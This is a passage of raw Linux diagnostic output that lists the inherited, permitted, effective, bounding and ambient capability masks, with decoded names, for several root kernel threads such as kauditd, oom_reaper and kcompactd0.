  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 16 (migration/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 18 (cpuhp/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 19 (cpuhp/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 20 (migration/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 21 (ksoftirqd/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 23 (kworker/1:0H-events_highpri) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 26 (kdevtmpfs) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 27 (inet_frag_wq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 28 (kauditd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 29 (khungtaskd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 31 (oom_reaper) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 32 (writeback) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 33 (kcompactd0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
